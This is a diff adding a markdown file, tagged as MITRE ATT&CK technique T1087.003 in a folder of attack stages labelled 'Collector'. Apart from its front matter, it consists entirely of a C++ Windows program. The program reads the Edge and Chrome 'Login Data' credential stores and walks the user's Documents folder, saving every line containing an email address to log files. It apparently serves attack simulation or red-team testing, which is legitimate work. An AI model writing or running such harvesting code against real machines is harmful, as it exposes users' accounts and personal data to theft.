@@ -1,0 +1,86 @@
+---
+title: "Discovery.T1087.003.Email Account"
+folder: "Całe Ataki/2. Collector"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <string>
+#include <filesystem>
+
+void CopyLinesWithEmail(const char* inputFile, const char* outputFile) {
+    std::ifstream input(inputFile);
+    std::ofstream output(outputFile);
+
+    if (!input.is_open()) {
+        std::cerr << "Unable to open input file: " << inputFile << std::endl;
+        return;
+    }
+
+    if (!output.is_open()) {
+        std::cerr << "Unable to open output file: " << outputFile << std::endl;
+        return;
+    }
+
+    std::string line;
+    while (std::getline(input, line)) {
+        if (line.find('@') != std::string::npos) {
+            output << line << std::endl;
+        }
+    }
+
+    input.close();
+    output.close();
+}
+
+void CopyLinesWithEmail(const std::string& directory, const std::string& outputFile) {
+    std::ofstream output(outputFile);
+
+    if (!output.is_open()) {
+        std::cerr << "Unable to open output file: " << outputFile << std::endl;
+        return;
+    }
+
+    for (const auto& entry: std::filesystem::recursive_directory_iterator(directory)) {
+        if (entry.is_regular_file()) {
+            std::ifstream input(entry.path());
+
+            if (!input.is_open()) {
+                std::cerr << "Unable to open input file: " << entry.path() << std::endl;
+                continue;
+            }
+
+            std::string line;
+            while (std::getline(input, line)) {
+                if (line.find('@') != std::string::npos) {
+                    output << line << std::endl;
+                }
+            }
+
+            input.close();
+        }
+    }
+
+    output.close();
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    const char* inputFile = "C:\\Users\\User\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
+    const char* outputFile = "C:\\Users\\User\\Downloads\\logs\\EdgeEmail.txt";
+
+    CopyLinesWithEmail(inputFile, outputFile);
+    const char* inputFile1 = "C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+    const char* outputFile1 = "C:\\Users\\User\\Downloads\\logs\\ChromeEmail.txt";
+    CopyLinesWithEmail(inputFile1, outputFile1);
+
+    std::string directory1 = "C:\\Users\\User\\Documents"; 
+    std::string outputFile2 = "C:\\Users\\User\\Downloads\\logs\\Dokumenty.txt"; 
+
+    CopyLinesWithEmail(directory1, outputFile2);
+    return 0;
+}
